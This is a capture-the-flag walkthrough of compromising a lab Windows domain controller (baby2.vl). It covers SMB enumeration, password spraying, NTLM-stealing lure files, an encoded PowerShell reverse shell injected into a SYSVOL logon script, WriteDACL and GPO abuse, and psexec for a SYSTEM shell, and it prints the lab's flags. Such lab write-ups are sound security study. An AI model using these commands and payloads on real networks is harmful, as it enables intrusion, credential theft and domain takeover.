
## CTF Writeup: BabyTwo

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.76.122
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-25 11:56 -0500
Nmap scan report for 10.129.76.122
Host is up (0.030s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-25 16:58:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-09-25T16:59:22+00:00
|_ssl-date: 2026-09-25T17:00:02+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=dc.baby2.vl
| Not valid before: 2026-09-24T16:54:15
|_Not valid after:  2027-03-26T16:54:15
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
50483/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50484/tcp open  msrpc         Microsoft Windows RPC
50502/tcp open  msrpc         Microsoft Windows RPC
61755/tcp open  msrpc         Microsoft Windows RPC
61760/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-25T16:59:27
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 230.37 seconds
```

The target seems to be an DC judging from port 53, 88 & 389 being open. The TCP Scan also revealed a lot of information about the domainname "baby2.vl", the FQDN of the DC "dc.baby2.vl", the hostname "dc" and one more SAN called "BABY2". I'll map them all to the target ip address in my local dns file.

```
echo "10.129.76.122 dc.baby2.vl baby2.vl dc BABY2" | tee -a /etc/hosts
```

Checked if we can enumerate SMB Shares as anonymous user, wasn't possible.

```
nxc smb baby2.vl -u '' -p '' --shares
SMB         10.129.76.122   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.76.122   445    DC               [+] baby2.vl\: 
SMB         10.129.76.122   445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Let's check if guest user is enabled. It is and revealed multiple non-default SMB Shares. Including one Share with READ perms "apps" & another SMB Share with "READ & WRITE perms which is a lot. Before actually checking out the Shares, let's enumerate domain users.

```
nxc smb baby2.vl -u 'guest' -p '' --shares
SMB         10.129.76.122   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.76.122   445    DC               [+] baby2.vl\guest: 
SMB         10.129.76.122   445    DC               [*] Enumerated shares
SMB         10.129.76.122   445    DC               Share           Permissions     Remark
SMB         10.129.76.122   445    DC               -----           -----------     ------
SMB         10.129.76.122   445    DC               ADMIN$                          Remote Admin
SMB         10.129.76.122   445    DC               apps            READ            
SMB         10.129.76.122   445    DC               C$                              Default share
SMB         10.129.76.122   445    DC               docs                            
SMB         10.129.76.122   445    DC               homes           READ,WRITE      
SMB         10.129.76.122   445    DC               IPC$            READ            Remote IPC
SMB         10.129.76.122   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.76.122   445    DC               SYSVOL                          Logon server share
```

Enumerated domain users and stored the output inside an newusers.txt file.

```
nxc smb baby2.vl -u 'guest' -p '' --rid-brute
```

Formatted the output to an users.txt wordlist for future password spraying attempts.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Tried enumerating LDAP Information as guest user, but auth failed.

```
ldapsearch -H "ldap://baby2.vl" -D guest@baby2.vl -w '' -b "dc=baby2,dc=vl" "*" > ldapsearch.txt
```

Let's proceed with checking out the SMB Shares. Decided to first connect inside the SMB Share in which we have write permissions aswell.

```
smbclient \\\\baby2.vl/homes -U guest
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \>
```

It seems to be a lot of User Directories.

```
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Downloaded them all onto my local machine and viewed them, but it looks like there is no files inside.

```
tree                                                            
.
├── Amelia.Griffiths
├── Carl.Moore
├── Harry.Shaw
├── Joan.Jennings
├── Joel.Hurst
├── Kieran.Mitchell
├── library
├── Lynda.Bailey
├── Mohammed.Harris
├── Nicola.Lamb
└── Ryan.Jenkins

12 directories, 0 files
```

Interestingly enough tho we have access to all the user shares. We could technically utilize the tool "ntlm_theft" in order to create malicious files, which allow us to steal NTLM Hashes with responder! Let's do it and let's fill all the user directories, so one user clicks on it.

Since I already installed ntlm_theft.py from GitHub I used it and executed the following command:

```
python3 ntlm_theft.py -g all -s 10.10.14.57 -f hacked
```

This created an directory filled with multiple file extensions which grab the NTLM Hash and send it back to my local machine ip when a user executes the file.

I first started my responder on my local machine.

```
responder -I tun0
```

I'm gonna move inside the directory where all the malicious files are stored and then connect to the SMB Share from there and put all of them inside each user directory.

```
smbclient \\\\baby2.vl/homes -U guest
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> cd Amelia.Griffiths\
smb: \Amelia.Griffiths\> recurse ON
smb: \Amelia.Griffiths\> prompt OFF
smb: \Amelia.Griffiths\> mput *
```

I then iterated through every User Share and kept on uploading the malicious files.

I waited a couple of minutes and still didn't get a hit. So this share was probably just an rabbithole. I'll move onto the apps SMB Share.

```
smbclient \\\\baby2.vl/apps -U guest
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Downloaded all the files onto my local machine. Besides an interesting .vbs.lnk file which seems to be an encoded login script I couldn't find anything else. Since there isn't much options left I decided to password spray users with the username as there passwords and got an hit for user "Carl.Moore"!

```
nxc smb baby2.vl -u users.txt -p users.txt
```

```
Carl.Moore:Carl.Moore
```

Stored the password inside an passwords.txt and password sprayed other users for this password! But no results from that.

```
nxc smb baby2.vl -u users.txt -p passwords.txt --continue-on-success
```

I checked if user Carl.Moore can already RDP into the DC, but it doesn't look like it's possible!

```
nxc rdp baby2.vl -u Carl.Moore -p Carl.Moore
```

Enumerated his permissions on SMB Shares and those seem to be better than with guest authentication. He has read & write permissions on every non-default SMB Share!

```
nxc smb baby2.vl -u Carl.Moore -p Carl.Moore --shares
```

Proceeded with connecting to the /docs SMB Share.

```
smbclient \\\\baby2.vl/docs -U Carl.Moore
Password for [WORKGROUP\Carl.Moore]:
Try "help" to get a list of possible commands.
smb: \>
```

The SMB Share is empty, but since we have write permissions, let's also try & add our malicious files inside it to check if we can catch an NTLM Auth in responder.

Navigated inside the directory in which all my malicious files are stored and connected to the SMB Share and put them inside the Share.

```
smbclient \\\\baby2.vl/docs -U Carl.Moore
Password for [WORKGROUP\Carl.Moore]:
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mput *
```

Let's now wait and check responder, but nothing authenticates. I'm assuming this is another rabbithole.. xd VulnLab HTB Labs men.. :D 

Decided to download ldap information, but no password stored inside "description" or "info".

```
ldapsearch -H "ldap://baby2.vl" -D Carl.Moore@baby2.vl -w 'Carl.Moore' -b "dc=baby2,dc=vl" "*" > ldapsearch.txt
```

Let's download domain information onto our local machine using bloodhound-python and check for potential DACL Abuse!

```
bloodhound-python -u "Carl.Moore" -p "Carl.Moore" -ns 10.129.76.122 -d baby2.vl -c all
```

I then started up bloodhound on my local machine & uploaded all the domain information.

```
bloodhound-start
```

Marked current user "Carl.Moore" as owned, but he has no outbound object controls. Let's enumerate ASREP & Kerberoastable users. Nothing here.

Proceeded with enumerating any ADCS Attack Path / Vulnerable Template. But again nothing.

```
certipy-ad find -u Carl.Moore -p 'Carl.Moore' -dc-ip 10.129.76.122 -target baby2.vl -vulnerable -enabled
```

Since we also gained Write permissions onto the previously discovered /apps SMB Share, could we maybe add a custom logon script or smth like that inside or maybe add malicious .lnk files with ntlm_theft to steal NTLM Hashes? Let's try! I again moved into the directory in which my malicious files are stored and connected to the SMB Share and put them inside. What we can also try is actually replacing the script inside with an custom login.vbs.lnk file. To see if this file specifically get's executed.

```
mbclient \\\\baby2.vl/apps -U Carl.Moore
Password for [WORKGROUP\Carl.Moore]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Sep 25 12:51:34 2026
  ..                                  D        0  Tue Aug 22 15:10:21 2023
  dev                                 D        0  Thu Sep  7 14:13:50 2023

                6126847 blocks of size 4096. 1960610 blocks available
smb: \> cd dev\
```

On my local machine I changed the name of my hacked.lnk which got created by ntlm_theft.py to login.vbs.lnk.

```
mv hacked.lnk login.vbs.lnk
```

Uploaded the file onto the SMB Share, but also didn't get a hit. After some time I was stuck. I realised that I didn't password spray ALL users for the username as there password, so I reran and found out the library also has the password set to his username LMFAO!

```
nxc smb baby2.vl -u users.txt -p users.txt --continue-on-success
```

Stored the password inside our passwords.txt.

```
library:library
```

Sprayed users again with the new password, but couldn't find another hit.

```
nxc smb baby2.vl -u users.txt -p passwords.txt --continue-on-success
```

Marked user library as owned in BloodHound, but this user also doesn't have any interesting DACL we can abuse.
## Initial Access

I analyzed all of the other user's and identified that user "Amelia.Griffith" has an interesting .vbs script as logon script set in SYSVOL! The Issue is that I don't have write permissions there.

```
Logonscript:
\\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs
```

Connected to SYSVOL SMB Share

```
smbclient \\\\baby2.vl/SYSVOL -U library
Password for [WORKGROUP\library]:
Try "help" to get a list of possible commands.
smb: \>
```

Since checking write permissions in SMB Shares using nxc isn't 100% correct, because there could be custom DACL's which allow our current user to modify the login.vbs. We'll download the login.vbs file onto local machine, add some input on top of it for example an .ps1 reverse shell script and then try & put it back again. This could grant us an reverse shell as user "Amelia.Griffith"!

```
smb: \baby2.vl\scripts\> get login.vbs
```

I've added this payload inside of the login.vbs script on my local machine, I generated it using revshells.com and oriented myself of 0xdf's writeup.

```
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQA3ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"
```

Started up my listener on port 443.

```
rlwrap nc -lvnp 443
```

Connected to the SYSVOL SMB Share again and it actually worked! I put the login.vbs file inside and replaced it basically with the current one. This confirms our current user library having some sort of write permissions, which isn't being displayed by nxc.

```
smb: \baby2.vl\scripts\> put login.vbs 
putting file login.vbs as \baby2.vl\scripts\login.vbs (20.9 kB/s) (average 20.9 kB/s)
```

After some time I gained RCE as user "amelia.griffiths".

```
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.76.122] 63006
whoami
baby2\amelia.griffiths
```

Retrieved user.txt in C:\ Filesystem.

```
42783b2c1483aeb70eca6810f0645c38
```
## Privilege Escalation

Inspected our current user's amelia.griffiths outbound object control was promising. She is inside the "legacy" group, which has WriteDACL on the gpoadm. 

Since we don't have the password of amelia.griffiths, we have to abuse the WriteDACL internally, which we can do with PowerView.ps1.

1. Let's first transfer PowerView.ps1 onto the target and inject it into memory.

```
iwr -uri http://10.10.14.57/PowerView.ps1 -OutFile PowerView.ps1
. .\PowerView.ps1
```

2. Now I’ll give Amelia.Griffiths permissions over the GPOADM account, and then set the password:

```
Add-DomainObjectAcl -Rights all -TargetIdentity GPOADM -PrincipalIdentity Amelia.Griffiths
$cred = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword GPOADM -AccountPassword $cred
```

3. Verifying if password change worked:

```
nxc smb dc.baby2.vl -u GPOADM -p 'Password123!'
```

It worked! We successfully changed the password of the GPOADM user. Let's mark user GPOADM as owned aswell in BloodHound.

The GPOADM User has GenericAll over two group policy objects with high value, as they give full control over the domain itself.

In order to abuse this, we can use an tool called "pyGPOAbuse". Which will add our current user inside the Administrators Group.

1. I need the GPO ID, which BloodHound gives under the "Distinguished Name:" and Gpcpath: variables!

![](Pasted%20image%2020260925214447.png)

```
31B2F340-016D-11D2-945F-00C04FB984F9
```

2. Navigated into virtual environment.

```
python3 -m venv myenv
source myenv/bin/activate
```

3. Installed dependencies.

```
pip3 install -r requirements.txt
```

4. Executed the following command, which adds our current user into the Administrators Group.

```
python3 pygpoabuse.py baby2.vl/GPOADM:'Password123!' -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -command 'net localgroup administrators GPOADM /add' -f
```

After about 1 minute our current user got added to the Administrators Group!

```
nxc smb dc.baby2.vl -u GPOADM -p 'Password123!'
SMB         10.129.76.122   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.76.122   445    DC               [+] baby2.vl\GPOADM:Password123! (Pwn3d!)
```

Connected to the DC as Administrator and gained SYSTEM Shell via psexec.

```
impacket-psexec GPOADM:'Password123!'@dc.baby2.vl
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
293500962edc31fa154951eeeb5740f9
```